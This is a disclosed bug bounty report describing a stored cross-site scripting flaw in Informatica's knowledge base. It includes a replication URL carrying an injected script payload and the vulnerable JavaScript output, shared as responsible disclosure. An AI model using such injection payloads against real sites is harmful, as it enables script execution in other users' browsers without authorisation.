# [kb.informatica.com] Stored XSS

## Report Details
- **Report ID**: 170369
- **URL**: https://hackerone.com/reports/170369
- **State**: Closed
- **Severity**: high
- **Submitted**: 2016-09-19T09:07:25.925Z
- **Disclosed**: 2017-04-09T12:22:44.923Z

## Reporter
- **Username**: albinowax
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: informatica

## Vulnerability Information
kb.informatica.org is vulnerable to stored XSS as it stores user input in users' sessions, then reflects this input back inside a JavaScript block without adequate escaping.

To replicate this issue, first store the payload in your session by visiting: https://kb.informatica.com/kbexternal/Pages/KBSearchResults.aspx?k=Support%20Console&fromsource=11171"%3balert(1)%2f%2f535

Then visit https://kb.informatica.com/faq/1/Pages/17033.aspx?docid=17033&type=external&isSearch=external

This should trigger an alert, due to the following HTML in the second response: 
<script type="text/javascript">
//<![CDATA[
var isExternal = true; var varSearchResultURL = "http://kb.informatica.com:7001/kbexternal/Pages/KBSearchResults.aspx?k=Support Console&fromsource=11171";alert(1)//535";

Replicating this may take a few attempts - it's a bit flaky. I used Firefox but it ought to work in any browser. Let me know if you have trouble.

## Attachments
No attachments
